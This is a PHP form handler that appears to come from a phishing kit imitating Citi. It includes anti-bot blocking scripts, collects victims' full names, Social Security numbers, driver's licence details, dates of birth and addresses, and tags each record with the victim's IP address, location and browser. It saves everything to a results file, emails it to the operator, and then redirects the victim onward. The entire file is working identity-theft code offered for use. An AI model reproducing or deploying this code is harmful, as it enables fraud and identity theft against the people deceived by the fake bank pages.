<?php
ob_start();
session_start();

include'../../Anti/IP-BlackList.php';  
include'../../Anti/Bot-Crawler.php';
include'../../Anti/Bot-Spox.php';
include'../../Anti/blacklist.php';
include'../../Anti/new.php';
include'../../Anti/Dila_DZ.php';

if(isset($_POST['first_name'])&&isset($_POST['last_name'])){
	include '../../admin/YOUR-CONFIG.php';
	include '../../prevents/main.php';
	
	$v_ip = $_SERVER['REMOTE_ADDR'];
    $v_agent = $_SERVER['HTTP_USER_AGENT'];
    $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
	$firstname = $_SESSION['fullname'] = $_POST['first_name'];
	$lastname = $_SESSION['lastname'] = $_POST['last_name'];
    $DateOfBirth = $_SESSION['DateOfBirth'] = $_POST['dob'];
    $StreetAddress = $_SESSION['StreetAddress'] = $_POST['street1'];
    $ZipCode = $_SESSION['ZipCode'] = $_POST['zipcode'];
    $CityR = $_SESSION['CityR'] = $_POST['city'];
	$LicenseNumber = $_SESSION['LicenseNumber'] = $_POST['dl'];
	$LicenseState = $_SESSION['$LicenseState'] = $_POST['dlstate'];
    $LicenseNExp = $_SESSION['LicenseNExp'] = $_POST['dlexp'];
	$SecurityNumber = $_SESSION['SecurityNumber'] = $_POST['ssn'];
	$VictimInfo1 = "| Submitted by : " . $v_ip . " (" . gethostbyaddr($v_ip) . ")";
	$VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
	$VictimInfo3 = "| Us3rAgent : " . $user_agent . "";
	$VictimInfo4 = "| Br0wser : " . $br . "";
	$VictimInfo5 = "| Os : " . $os . "";

	$message .= "+ 💎 Personal Information\n";
	$message .= "| Full n4me : $firstname $lastname\n";
	$message .= "| SSN : $SecurityNumber\n";
	$message .= "| D71v3R Lic3ns3  : $LicenseNumber / $LicenseState / $LicenseNExp\n";
	$message .= "| D4te of birth : $DateOfBirth\n";
	$message .= "| 4ddr3ss : $StreetAddress\n";
	$message .= "| Suite/4pt/oth3r	: {$_POST['street2']}\r\n";
	$message .= "| City : $CityR\n";
	$message .= "| Zip : $ZipCode\n";
	$message .= "+ ------------------------------------+\n";
	$message .= "+ 🌐 Victim Inf0rmation\n";
	$message .= "$VictimInfo1\n";
	$message .= "$VictimInfo2\n";
	$message .= "$VictimInfo3\n";
	$message .= "$VictimInfo4\n";
	$message .= "$VictimInfo5\n";
	$message .= "| 🕛 Received : $date\n";
	$message .= "+ ------------------------------------+\n";
	$message .= " https://ipgeolocation.io/ip-location/$ip \r\n";

		$save=fopen("../CITI_RESULT/Billing".$pin.".txt","a+");
        fwrite($save,$message);
        fclose($save);

	$subject = "+------- 💎 East code Personal Information: -------+\n".$_POST['first_name'];
	$head = "Content-type:text/plain;charset=UTF-8\r\n";
	$head .= "From: $from <$sender_mail>" . "\r\n";
    @mail($sender_mail ,$subject,$message,$head);
		
    $key = substr(sha1(mt_rand()),1,25);

	if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verification?/.jsp/efs/servlet/efs/"));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../Success?/.jsp/efs/servlet/efs/")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2UgDDbr"));
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>